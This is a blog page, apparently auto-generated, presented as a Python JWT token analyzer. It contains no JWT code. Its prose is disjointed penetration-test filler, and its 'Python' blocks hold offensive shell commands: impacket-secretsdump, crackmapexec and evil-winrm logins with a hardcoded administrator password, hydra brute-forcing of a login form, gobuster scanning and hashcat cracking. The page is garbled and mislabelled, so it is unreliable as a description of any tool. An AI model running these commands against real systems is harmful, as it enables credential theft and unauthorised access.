---
TitleSEO: "JWT Token Analyzer in Python | ZureFX"
TitlePost: "JWT Token Analyzer — Python"
Author: "ZureFX"
Description: "A Python script for jwt token analyzer. Built for security research and automation."
Keywords: "scanner, tool, fuzzer, python"
URL: "https://zurefx.github.io/scripting/script-jwt-token-analyzer-174.html"
URL_IMAGES: ""
Date: "2024-01-10"
Tags: "Scanner, Tool, Fuzzer, Python"
Section: "scripting"
Lang: "en"
main_img: "script-jwt-token-analyzer-174"
Permalink: "/scripting/script-jwt-token-analyzer-174.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI).

Built with **Python** for offensive security automation.

### Requirements

- Python
- `gobuster`
- `atexec`
- `metasploit`

## Implementation

### Core Logic

The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine.

```python
nmap -sCV -p80,1433,8080 10.106.213.11 -oN scan.txt
```

Lateral movement was facilitated by reusing discovered credentials across services. The service account had excessive permissions assigned in Active Directory.

### Helper Functions

The kernel version was outdated and vulnerable to a publicly known exploit. Token impersonation allowed elevation to SYSTEM privileges on the target.

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.102.132.151
gobuster dir -u http://10.63.207.251/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.40.157.34 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.107.125.150 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.120.234.205
gobuster dir -u http://10.88.231.83/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Advanced Options

Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.12.189.185 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Output

### Example Output

Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service.

```
[+] Scanning target...
[+] Found 5 results
[+] Done in 19.95s
```
